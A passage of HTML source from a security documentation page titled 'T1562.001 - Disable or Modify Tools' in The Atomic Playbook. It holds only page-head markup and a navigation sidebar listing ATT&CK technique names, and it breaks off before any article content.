

<!DOCTYPE html>


<html lang="en" data-content_root="" >

  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.18.1: http://docutils.sourceforge.net/" />

    <title>T1562.001 - Disable or Modify Tools &#8212; The Atomic Playbook</title>
  
  
  
  <script data-cfasync="false">
    document.documentElement.dataset.mode = localStorage.getItem("mode") || "";
    document.documentElement.dataset.theme = localStorage.getItem("theme") || "light";
  </script>
  
  <!-- Loaded before other Sphinx assets -->
  <link href="../../_static/styles/theme.css?digest=bd9e20870c6007c4c509" rel="stylesheet" />
<link href="../../_static/styles/bootstrap.css?digest=bd9e20870c6007c4c509" rel="stylesheet" />
<link href="../../_static/styles/pydata-sphinx-theme.css?digest=bd9e20870c6007c4c509" rel="stylesheet" />

  
  <link href="../../_static/vendor/fontawesome/6.5.1/css/all.min.css?digest=bd9e20870c6007c4c509" rel="stylesheet" />
  <link rel="preload" as="font" type="font/woff2" crossorigin href="../../_static/vendor/fontawesome/6.5.1/webfonts/fa-solid-900.woff2" />
<link rel="preload" as="font" type="font/woff2" crossorigin href="../../_static/vendor/fontawesome/6.5.1/webfonts/fa-brands-400.woff2" />
<link rel="preload" as="font" type="font/woff2" crossorigin href="../../_static/vendor/fontawesome/6.5.1/webfonts/fa-regular-400.woff2" />

    <link rel="stylesheet" type="text/css" href="../../_static/pygments.css" />
    <link rel="stylesheet" href="../../_static/styles/sphinx-book-theme.css?digest=14f4ca6b54d191a8c7657f6c759bf11a5fb86285" type="text/css" />
    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.4510f1fc1dee50b3e5859aac5469c37c29e427902b24a333a5f9fcb2f0b3ac41.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/design-style.4045f2051d55cab465a707391d5b2007.min.css" />
  
  <!-- Pre-loaded scripts that we'll load fully later -->
  <link rel="preload" as="script" href="../../_static/scripts/bootstrap.js?digest=bd9e20870c6007c4c509" />
<link rel="preload" as="script" href="../../_static/scripts/pydata-sphinx-theme.js?digest=bd9e20870c6007c4c509" />
  <script src="../../_static/vendor/fontawesome/6.5.1/js/all.min.js?digest=bd9e20870c6007c4c509"></script>

    <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
    <script src="../../_static/jquery.js"></script>
    <script src="../../_static/underscore.js"></script>
    <script src="../../_static/_sphinx_javascript_frameworks_compat.js"></script>
    <script src="../../_static/doctools.js"></script>
    <script src="../../_static/clipboard.min.js"></script>
    <script src="../../_static/copybutton.js"></script>
    <script src="../../_static/scripts/sphinx-book-theme.js?digest=5a5c038af52cf7bc1a1ec88eea08e6366ee68824"></script>
    <script>let toggleHintShow = 'Click to show';</script>
    <script>let toggleHintHide = 'Click to hide';</script>
    <script>let toggleOpenOnPrint = 'true';</script>
    <script src="../../_static/togglebutton.js"></script>
    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown';</script>
    <script src="../../_static/design-tabs.js"></script>
    <script>const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"
const thebe_selector = ".thebe,.cell"
const thebe_selector_input = "pre"
const thebe_selector_output = ".output, .cell_output"
</script>
    <script async="async" src="../../_static/sphinx-thebe.js"></script>
    <script>DOCUMENTATION_OPTIONS.pagename = 'tactics/defense-evasion/T1562.001';</script>
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Search" href="../../search.html" />
    <link rel="next" title="T1562.002 - Disable Windows Event Logging" href="T1562.002.html" />
    <link rel="prev" title="T1556 - Modify Authentication Process" href="T1556.html" />
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <meta name="docsearch:language" content="en"/>
  </head>
  
  
  <body data-bs-spy="scroll" data-bs-target=".bd-toc-nav" data-offset="180" data-bs-root-margin="0px 0px -60%" data-default-mode="">

  
  
  <a id="pst-skip-link" class="skip-link" href="#main-content">Skip to main content</a>
  
  <div id="pst-scroll-pixel-helper"></div>

  
  <button type="button" class="btn rounded-pill" id="pst-back-to-top">
    <i class="fa-solid fa-arrow-up"></i>
    Back to top
  </button>

  
  <input type="checkbox"
          class="sidebar-toggle"
          name="__primary"
          id="__primary"/>
  <label class="overlay overlay-primary" for="__primary"></label>
  
  <input type="checkbox"
          class="sidebar-toggle"
          name="__secondary"
          id="__secondary"/>
  <label class="overlay overlay-secondary" for="__secondary"></label>
  
  <div class="search-button__wrapper">
    <div class="search-button__overlay"></div>
    <div class="search-button__search-container">
<form class="bd-search d-flex align-items-center"
      action="../../search.html"
      method="get">
  <i class="fa-solid fa-magnifying-glass"></i>
  <input type="search"
         class="form-control"
         name="q"
         id="search-input"
         placeholder="Search this book..."
         aria-label="Search this book..."
         autocomplete="off"
         autocorrect="off"
         autocapitalize="off"
         spellcheck="false"/>
  <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd>K</kbd></span>
</form></div>
  </div>

  <header>
  
    <div class="bd-header navbar navbar-expand-lg bd-navbar">
    </div>
  
  </header>

  <div class="bd-container">
    <div class="bd-container__inner bd-page-width">
      
      
      
        
      
      <div class="bd-sidebar-primary bd-sidebar">
        

  
  <div class="sidebar-header-items sidebar-primary__section">
    
    
    
    
  </div>
  
    <div class="sidebar-primary-items__start sidebar-primary__section">
        <div class="sidebar-primary-item">

  

<a class="navbar-brand logo" href="../../intro.html">
  
  
  
  
  
    
    
      
    
    
    <img src="../../_static/logo.png" class="logo__image only-light" alt="The Atomic Playbook - Home"/>
    <script>document.write(`<img src="../../_static/logo.png" class="logo__image only-dark" alt="The Atomic Playbook - Home"/>`);</script>
  
  
</a></div>
        <div class="sidebar-primary-item"><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
    <div class="bd-toc-item navbar-nav active">
        
        <ul class="nav bd-sidenav bd-sidenav__home-link">
            <li class="toctree-l1">
                <a class="reference internal" href="../../intro.html">
                    Welcome to the Atomic Playbook
                </a>
            </li>
        </ul>
        <ul class="current nav bd-sidenav">
<li class="toctree-l1 has-children"><a class="reference internal" href="../initial-access.html">Initial Access</a><input class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-1"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1078.001.html">T1078.001 - Default Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1078.002.html">T1078.002 - Domain Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1078.003.html">T1078.003 - Local Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1078.004.html">T1078.004 - Cloud Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1078.html">T1078 - Valid Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1091.html">T1091 - Replication Through Removable Media</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1133.html">T1133 - External Remote Services</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1189.html">T1189 - Drive-by Compromise</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1190.html">T1190 - Exploit Public-Facing Application</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1195.001.html">T1195.001 - Compromise Software Dependencies and Development Tools</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1195.002.html">T1195.002 - Compromise Software Supply Chain</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1195.003.html">T1195.003 - Compromise Hardware Supply Chain</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1195.html">T1195 - Supply Chain Compromise</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1199.html">T1199 - Trusted Relationship</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1200.html">T1200 - Hardware Additions</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1566.001.html">T1566.001 - Spearphishing Attachment</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1566.002.html">T1566.002 - Spearphishing Link</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1566.003.html">T1566.003 - Spearphishing via Service</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1566.004.html">T1566.004 - Spearphishing Voice</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1566.html">T1566 - Phishing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../initial-access/T1659.html">T1659 - Content Injection</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../execution.html">Execution</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-2"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1047.html">T1047 - Windows Management Instrumentation</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1053.002.html">T1053.002 - At</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1053.003.html">T1053.003 - Cron</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1053.005.html">T1053.005 - Scheduled Task</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1053.006.html">T1053.006 - Systemd Timers</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1053.007.html">T1053.007 - Container Orchestration Job</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1053.html">T1053 - Scheduled Task/Job</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1059.001.html">T1059.001 - PowerShell</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1059.002.html">T1059.002 - AppleScript</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1059.003.html">T1059.003 - Windows Command Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1059.004.html">T1059.004 - Unix Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1059.005.html">T1059.005 - Visual Basic</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1059.006.html">T1059.006 - Python</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1059.007.html">T1059.007 - JavaScript</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1059.008.html">T1059.008 - Network Device CLI</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1059.009.html">T1059.009 - Cloud API</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1059.html">T1059 - Command and Scripting Interpreter</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1072.html">T1072 - Software Deployment Tools</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1106.html">T1106 - Native API</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1129.html">T1129 - Shared Modules</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1203.html">T1203 - Exploitation for Client Execution</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1204.001.html">T1204.001 - Malicious Link</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1204.002.html">T1204.002 - Malicious File</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1204.003.html">T1204.003 - Malicious Image</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1204.html">T1204 - User Execution</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1559.001.html">T1559.001 - Component Object Model</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1559.002.html">T1559.002 - Dynamic Data Exchange</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1559.003.html">T1559.003 - XPC Services</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1559.html">T1559 - Inter-Process Communication</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1569.001.html">T1569.001 - Launchctl</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1569.002.html">T1569.002 - Service Execution</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1569.html">T1569 - System Services</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1609.html">T1609 - Container Administration Command</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1610.html">T1610 - Deploy Container</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1648.html">T1648 - Serverless Execution</a></li>
<li class="toctree-l2"><a class="reference internal" href="../execution/T1651.html">T1651 - Cloud Administration Command</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../persistence.html">Persistence</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-3"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1037.001.html">T1037.001 - Logon Script (Windows)</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1037.002.html">T1037.002 - Login Hook</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1037.003.html">T1037.003 - Network Logon Script</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1037.004.html">T1037.004 - RC Scripts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1037.005.html">T1037.005 - Startup Items</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1037.html">T1037 - Boot or Logon Initialization Scripts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1053.002.html">T1053.002 - At</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1053.003.html">T1053.003 - Cron</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1053.005.html">T1053.005 - Scheduled Task</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1053.006.html">T1053.006 - Systemd Timers</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1053.007.html">T1053.007 - Container Orchestration Job</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1053.html">T1053 - Scheduled Task/Job</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1078.001.html">T1078.001 - Default Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1078.002.html">T1078.002 - Domain Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1078.003.html">T1078.003 - Local Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1078.004.html">T1078.004 - Cloud Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1078.html">T1078 - Valid Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1098.001.html">T1098.001 - Additional Cloud Credentials</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1098.002.html">T1098.002 - Additional Email Delegate Permissions</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1098.003.html">T1098.003 - Additional Cloud Roles</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1098.004.html">T1098.004 - SSH Authorized Keys</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1098.005.html">T1098.005 - Device Registration</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1098.006.html">T1098.006 - Additional Container Cluster Roles</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1098.html">T1098 - Account Manipulation</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1133.html">T1133 - External Remote Services</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1136.001.html">T1136.001 - Local Account</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1136.002.html">T1136.002 - Domain Account</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1136.003.html">T1136.003 - Cloud Account</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1136.html">T1136 - Create Account</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1137.001.html">T1137.001 - Office Template Macros</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1137.002.html">T1137.002 - Office Test</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1137.003.html">T1137.003 - Outlook Forms</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1137.004.html">T1137.004 - Outlook Home Page</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1137.005.html">T1137.005 - Outlook Rules</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1137.006.html">T1137.006 - Add-ins</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1137.html">T1137 - Office Application Startup</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1176.html">T1176 - Browser Extensions</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1197.html">T1197 - BITS Jobs</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1205.001.html">T1205.001 - Port Knocking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1205.002.html">T1205.002 - Socket Filters</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1205.html">T1205 - Traffic Signaling</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1505.001.html">T1505.001 - SQL Stored Procedures</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1505.002.html">T1505.002 - Transport Agent</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1505.003.html">T1505.003 - Web Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1505.004.html">T1505.004 - IIS Components</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1505.005.html">T1505.005 - Terminal Services DLL</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1505.html">T1505 - Server Software Component</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1525.html">T1525 - Implant Internal Image</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1542.001.html">T1542.001 - System Firmware</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1542.002.html">T1542.002 - Component Firmware</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1542.003.html">T1542.003 - Bootkit</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1542.004.html">T1542.004 - ROMMONkit</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1542.005.html">T1542.005 - TFTP Boot</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1542.html">T1542 - Pre-OS Boot</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1543.001.html">T1543.001 - Launch Agent</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1543.002.html">T1543.002 - Systemd Service</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1543.003.html">T1543.003 - Windows Service</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1543.004.html">T1543.004 - Launch Daemon</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1543.html">T1543 - Create or Modify System Process</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.001.html">T1546.001 - Change Default File Association</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.002.html">T1546.002 - Screensaver</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.003.html">T1546.003 - Windows Management Instrumentation Event Subscription</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.004.html">T1546.004 - Unix Shell Configuration Modification</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.005.html">T1546.005 - Trap</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.006.html">T1546.006 - LC_LOAD_DYLIB Addition</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.007.html">T1546.007 - Netsh Helper DLL</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.008.html">T1546.008 - Accessibility Features</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.009.html">T1546.009 - AppCert DLLs</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.010.html">T1546.010 - AppInit DLLs</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.011.html">T1546.011 - Application Shimming</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.012.html">T1546.012 - Image File Execution Options Injection</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.013.html">T1546.013 - PowerShell Profile</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.014.html">T1546.014 - Emond</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.015.html">T1546.015 - Component Object Model Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.016.html">T1546.016 - Installer Packages</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1546.html">T1546 - Event Triggered Execution</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1547.001.html">T1547.001 - Registry Run Keys / Startup Folder</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1547.002.html">T1547.002 - Authentication Package</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1547.003.html">T1547.003 - Time Providers</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1547.004.html">T1547.004 - Winlogon Helper DLL</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1547.005.html">T1547.005 - Security Support Provider</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1547.006.html">T1547.006 - Kernel Modules and Extensions</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1547.007.html">T1547.007 - Re-opened Applications</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1547.008.html">T1547.008 - LSASS Driver</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1547.009.html">T1547.009 - Shortcut Modification</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1547.010.html">T1547.010 - Port Monitors</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1547.012.html">T1547.012 - Print Processors</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1547.013.html">T1547.013 - XDG Autostart Entries</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1547.014.html">T1547.014 - Active Setup</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1547.015.html">T1547.015 - Login Items</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1547.html">T1547 - Boot or Logon Autostart Execution</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1554.html">T1554 - Compromise Client Software Binary</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1556.001.html">T1556.001 - Domain Controller Authentication</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1556.002.html">T1556.002 - Password Filter DLL</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1556.003.html">T1556.003 - Pluggable Authentication Modules</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1556.004.html">T1556.004 - Network Device Authentication</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1556.005.html">T1556.005 - Reversible Encryption</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1556.006.html">T1556.006 - Multi-Factor Authentication</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1556.007.html">T1556.007 - Hybrid Identity</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1556.008.html">T1556.008 - Network Provider DLL</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1556.html">T1556 - Modify Authentication Process</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1574.001.html">T1574.001 - DLL Search Order Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1574.002.html">T1574.002 - DLL Side-Loading</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1574.004.html">T1574.004 - Dylib Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1574.005.html">T1574.005 - Executable Installer File Permissions Weakness</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1574.006.html">T1574.006 - Dynamic Linker Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1574.007.html">T1574.007 - Path Interception by PATH Environment Variable</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1574.008.html">T1574.008 - Path Interception by Search Order Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1574.009.html">T1574.009 - Path Interception by Unquoted Path</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1574.010.html">T1574.010 - Services File Permissions Weakness</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1574.011.html">T1574.011 - Services Registry Permissions Weakness</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1574.012.html">T1574.012 - COR_PROFILER</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1574.013.html">T1574.013 - KernelCallbackTable</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1574.html">T1574 - Hijack Execution Flow</a></li>
<li class="toctree-l2"><a class="reference internal" href="../persistence/T1653.html">T1653 - Power Settings</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../privilege-escalation.html">Privilege Escalation</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-4"><i class="fa-solid fa-chevron-down"></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1037.001.html">T1037.001 - Logon Script (Windows)</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1037.002.html">T1037.002 - Login Hook</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1037.003.html">T1037.003 - Network Logon Script</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1037.004.html">T1037.004 - RC Scripts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1037.005.html">T1037.005 - Startup Items</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1037.html">T1037 - Boot or Logon Initialization Scripts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1053.002.html">T1053.002 - At</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1053.003.html">T1053.003 - Cron</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1053.005.html">T1053.005 - Scheduled Task</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1053.006.html">T1053.006 - Systemd Timers</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1053.007.html">T1053.007 - Container Orchestration Job</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1053.html">T1053 - Scheduled Task/Job</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1055.001.html">T1055.001 - Dynamic-link Library Injection</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1055.002.html">T1055.002 - Portable Executable Injection</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1055.003.html">T1055.003 - Thread Execution Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1055.004.html">T1055.004 - Asynchronous Procedure Call</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1055.005.html">T1055.005 - Thread Local Storage</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1055.008.html">T1055.008 - Ptrace System Calls</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1055.009.html">T1055.009 - Proc Memory</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1055.011.html">T1055.011 - Extra Window Memory Injection</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1055.012.html">T1055.012 - Process Hollowing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1055.013.html">T1055.013 - Process Doppelgänging</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1055.014.html">T1055.014 - VDSO Hijacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1055.015.html">T1055.015 - ListPlanting</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1055.html">T1055 - Process Injection</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1068.html">T1068 - Exploitation for Privilege Escalation</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1078.001.html">T1078.001 - Default Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1078.002.html">T1078.002 - Domain Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1078.003.html">T1078.003 - Local Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1078.004.html">T1078.004 - Cloud Accounts</a></li>
<li class="toctree-l2"><a class="reference internal" href="../privilege-escalation/T1078.html">T1078 - Valid Accounts</a></li>
